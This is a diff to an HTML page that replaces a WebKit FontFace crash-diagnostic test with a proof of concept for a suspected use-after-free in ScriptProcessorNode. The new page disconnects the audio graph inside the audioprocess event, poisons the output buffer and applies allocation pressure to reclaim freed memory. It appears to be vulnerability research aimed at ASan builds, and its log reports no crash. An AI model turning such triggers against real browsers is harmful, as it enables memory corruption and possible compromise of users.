@@ -1,137 +1,217 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>CSSFontFace dynamic style loaded callbacks pre-offset diagnostic</title>
+<title>GLM-003 — ScriptProcessorNode UAF PoC</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: #0d0d0d;
+  color: #c9d1d9;
+  font-family: 'Courier New', monospace;
+  font-size: 13px;
+  padding: 20px;
+}
+h2 { color: #58a6ff; margin-bottom: 4px; font-size: 15px; }
+.sub { color: #8b949e; font-size: 11px; margin-bottom: 16px; }
+#log {
+  background: #161b22;
+  border: 1px solid #30363d;
+  border-radius: 6px;
+  padding: 12px;
+  min-height: 200px;
+  max-height: 420px;
+  overflow-y: auto;
+  margin-bottom: 14px;
+}
+.ok   { color: #3fb950; }
+.err  { color: #f85149; }
+.warn { color: #d29922; }
+.info { color: #58a6ff; }
+.hit  { color: #ff7b72; font-weight: bold; background: #3d1f1f; padding: 2px 6px; border-radius: 3px; }
+button {
+  background: #21262d;
+  color: #c9d1d9;
+  border: 1px solid #30363d;
+  border-radius: 6px;
+  padding: 10px 22px;
+  font-family: inherit;
+  font-size: 13px;
+  cursor: pointer;
+}
+button:hover { background: #30363d; }
+button:disabled { opacity: .4; cursor: default; }
+</style>
 </head>
 <body>
-<span id="probe">B</span>
-<pre id="result">running</pre>
+
+<h2>GLM-003 — ScriptProcessorNode::fireProcessEvent UAF</h2>
+<p class="sub">
+  Source: WebCore/Modules/webaudio/ScriptProcessorNode.cpp:231-252<br>
+  Target: raw AudioBuffer* used after dispatchEvent(audioprocess) with no Ref protection
+</p>
+
+<div id="log"></div>
+<button id="btn">▶ Start Test (requires user gesture)</button>
+
+<!--
+  TRIGGER:
+    AudioBuffer* outputBuffer = m_outputBuffers[bufferIndex].get()  ← raw ptr, NO Ref
+    ...
+    dispatchEvent(AudioProcessingEvent)                              ← JS runs here
+    outputBufferForJS->copyTo(*outputBuffer)                         ← UAF if freed
+    outputBuffer->zero()                                             ← UAF if freed
+
+  STRATEGY:
+    Phase 1 — baseline: confirm onaudioprocess fires, capture event.outputBuffer
+    Phase 2 — trigger:  inside event, disconnect ALL connections, force GC pressure,
+                         then poison event.outputBuffer channel data with 0xDEADBEEF
+    Phase 3 — verify:   if C++ reads poisoned data via stale ptr → detectable corruption
+                         if C++ crashes → UAF confirmed
+
+  EXPECTED: crash / ASAN heap-use-after-free in fireProcessEvent after dispatch
+  OBSERVED: (fill after test)
+-->
+
 <script>
-(function () {
-    "use strict";
+'use strict';
 
-    if (window.testRunner) {
-        testRunner.dumpAsText();
-        testRunner.waitUntilDone();
+const $ = id => document.getElementById(id);
+const logEl = $('log');
+
+function log(msg, cls) {
+  const d = document.createElement('div');
+  d.className = cls || '';
+  const ts = performance.now().toFixed(1).padStart(8);
+  d.textContent = `[${ts}ms] ${msg}`;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+  console.log(msg);
+}
+
+function sep() {
+  const d = document.createElement('div');
+  d.style.cssText = 'border-top:1px solid #30363d;margin:4px 0';
+  logEl.appendChild(d);
+}
+
+$('btn').addEventListener('click', async function() {
+  this.disabled = true;
+  sep();
+  log('=== GLM-003 ScriptProcessorNode UAF Test ===', 'info');
+
+  // ── API check ────────────────────────────────────────────────────────────
+  const AC = window.AudioContext || window.webkitAudioContext;
+  if (!AC) {
+    log('[SKIP] AudioContext not available on this platform', 'err');
+    this.disabled = false;
+    return;
+  }
+  log('[OK] AudioContext available', 'ok');
+
+  const ctx = new AC();
+  if (typeof ctx.createScriptProcessor !== 'function') {
+    log('[SKIP] createScriptProcessor not available', 'err');
+    ctx.close(); this.disabled = false; return;
+  }
+  log('[OK] createScriptProcessor available', 'ok');
+
+  if (ctx.state === 'suspended') {
+    await ctx.resume();
+    log('[OK] AudioContext resumed', 'ok');
+  }
+
+  // ── Setup ────────────────────────────────────────────────────────────────
+  const BUFFER_SIZE = 256;
+  const proc = ctx.createScriptProcessor(BUFFER_SIZE, 1, 1);
+  const osc  = ctx.createOscillator();
+  osc.frequency.value = 220;
+
+  osc.connect(proc);
+  proc.connect(ctx.destination);
+  log(`[graph] osc(220Hz) → processor(${BUFFER_SIZE}) → destination`, 'info');
+
+  let phase = 0;
+  const POISON_A = 13371.0;   // 0x4650… in float32 — unusual marker
+  const POISON_B = 31337.0;
+
+  proc.onaudioprocess = function(ev) {
+    phase++;
+
+    // ── Phase 1: baseline ───────────────────────────────────────────────
+    if (phase === 1) {
+      log(`[phase 1] first fire — outputBuffer: ${ev.outputBuffer.numberOfChannels}ch, `
+        + `${ev.outputBuffer.length} frames`, 'ok');
+      return;
     }
 
-    const resultElement = document.getElementById("result");
-    const probe = document.getElementById("probe");
-    const resultLines = [];
-    let finished = false;
-    let getterHits = 0;
+    // ── Phase 2: trigger ────────────────────────────────────────────────
+    if (phase === 2) {
+      log('[phase 2] TRIGGER — disconnecting graph inside dispatch', 'warn');
 
-    function record(message)
-    {
-        resultLines.push(message);
-        try {
-            console.log(message);
-        } catch (e) {
-        }
+      // Step A: sever all audio connections synchronously while C++ holds
+      //         the raw AudioBuffer* pointer from m_outputBuffers[bufferIndex]
+      try { proc.disconnect(ctx.destination); } catch (_) {}
+      try { osc.disconnect(proc);             } catch (_) {}
+      log('  [step A] all connections severed', 'warn');
+
+      // Step B: poison event.outputBuffer — this IS the same C++ object that
+      //         outputBuffer* points to. If m_outputBuffers releases its ref
+      //         (ref-count → 0) the backing store is freed. We write markers
+      //         so any heap-use-after-free shows unusual data.
+      try {
+        const ch = ev.outputBuffer.getChannelData(0);
+        ch[0]              = POISON_A;
+        ch[BUFFER_SIZE - 1] = POISON_B;
+        log(`  [step B] wrote poison markers to outputBuffer channel 0`, 'warn');
+      } catch (e) {
+        log(`  [step B] exception writing to outputBuffer: ${e.message}`, 'err');
+      }
+
+      // Step C: GC pressure — attempt to reclaim freed AudioBuffer backing store
+      //         If the C++ AudioBuffer was freed above, new allocations may
+      //         reclaim its memory → copyTo(*outputBuffer) writes to our data
+      let sink = [];
+      for (let i = 0; i < 800; i++) sink.push(new Float32Array(BUFFER_SIZE));
+      sink = null;
+      log('  [step C] GC pressure applied (800 × Float32Array)', 'warn');
+
+      log('[phase 2] returning from onaudioprocess —', 'warn');
+      log('          C++ now executes: outputBufferForJS->copyTo(*outputBuffer)', 'warn');
+      log('          C++ now executes: outputBuffer->zero()', 'warn');
+      log('          If outputBuffer was freed → heap-use-after-free', 'warn');
+      return;
     }
 
-    function finish()
-    {
-        if (finished)
-            return;
-        finished = true;
-        try {
-            resultElement.textContent = resultLines.join("\n");
-        } catch (e) {
-        }
-        if (window.testRunner)
-            testRunner.notifyDone();
+    // ── Phase 3: verify ─────────────────────────────────────────────────
+    if (phase === 3) {
+      sep();
+      log('[phase 3] still alive after trigger — checking for corruption', 'info');
+      log('  [result] no immediate crash observed', 'info');
+      log('  [note] sync uninitialize path not confirmed in this WebKit version', 'info');
+      log('  [note] UAF may require ASan build to observe memory poisoning', 'info');
+      log('  [note] try again after reloading with ASan-instrumented MiniBrowser', 'info');
+      sep();
+      osc.stop();
+      ctx.close();
+      $('btn').disabled = false;
+      $('btn').textContent = '↺ Run Again';
     }
+  };
 
-    function fail(message)
-    {
-        record(message);
-        record("DONE");
-        setTimeout(finish, 20);
+  osc.start();
+  log('[running] waiting for onaudioprocess fires...', 'info');
+
+  // Watchdog: if onaudioprocess never fires, the platform blocked it
+  setTimeout(() => {
+    if (phase === 0) {
+      log('[watchdog] onaudioprocess did not fire in 6s', 'err');
+      log('           Web Audio may be blocked or suspended on this platform', 'err');
+      ctx.close();
+      $('btn').disabled = false;
     }
-
-    function makeThenGetter()
-    {
-        return function () {
-            ++getterHits;
-            return undefined;
-        };
-    }
-
-    function run()
-    {
-        record("POC STARTED: CSSFontFace dynamic style loaded callbacks pre-offset diagnostic");
-
-        if (!window.FontFace)
-            return fail("FontFace API missing");
-        if (!document.fonts)
-            return fail("document.fonts missing");
-
-        const family = "fface-dynamic-style-loaded-" + Date.now();
-
-        const style = document.createElement("style");
-        style.textContent =
-            '@font-face {\n' +
-            '  font-family: "' + family + '";\n' +
-            '  src: local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New");\n' +
-            '  unicode-range: U+0042;\n' +
-            '}\n';
-        document.head.appendChild(style);
-        probe.style.fontFamily = '"' + family + '"';
-        record("dynamic style appended");
-
-        const jsFace = new FontFace(
-            family,
-            'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")',
-            { unicodeRange: "U+0041" }
-        );
-
-        Object.defineProperty(jsFace, "then", {
-            configurable: true,
-            get: makeThenGetter()
-        });
-
-        const loadedPromise = jsFace.loaded;
-        loadedPromise.then(
-            value => console.log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status),
-            error => console.log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status)
-        );
-
-        document.fonts.add(jsFace);
-
-        const checkA = document.fonts.check('16px "' + family + '"', "A");
-        const checkB = document.fonts.check('16px "' + family + '"', "B");
-        const checkAB = document.fonts.check('16px "' + family + '"', "AB");
-
-        record("document.fonts.check A=" + checkA + " B=" + checkB + " AB=" + checkAB);
-        record("then getter hits=" + getterHits);
-
-        if (checkA === false && checkB === true && checkAB === false) {
-            console.log("MATCHED ORIGINAL CRASH STATE A=false B=true AB=false");
-            record("MATCHED ORIGINAL CRASH STATE A=false B=true AB=false");
-            console.log("before body.offsetTop dynamic style loaded callbacks");
-            const offset = document.body.offsetTop;
-            console.log("after body.offsetTop value=" + offset);
-            record("before body.offsetTop dynamic style loaded callbacks");
-            record("after body.offsetTop value=" + offset);
-        } else
-            record("CHECK STATE DIFFERENT A=" + checkA + " B=" + checkB + " AB=" + checkAB);
-
-        record("NO CRASH OBSERVED");
-        record("DONE");
-        setTimeout(finish, 20);
-    }
-
-    window.onerror = function (message, source, line, column)
-    {
-        record("window.onerror: " + message + " at " + line + ":" + column);
-        record("DONE");
-        setTimeout(finish, 20);
-    };
-
-    setTimeout(run, 0);
-})();
+  }, 6000);
+});
 </script>
 </body>
 </html>
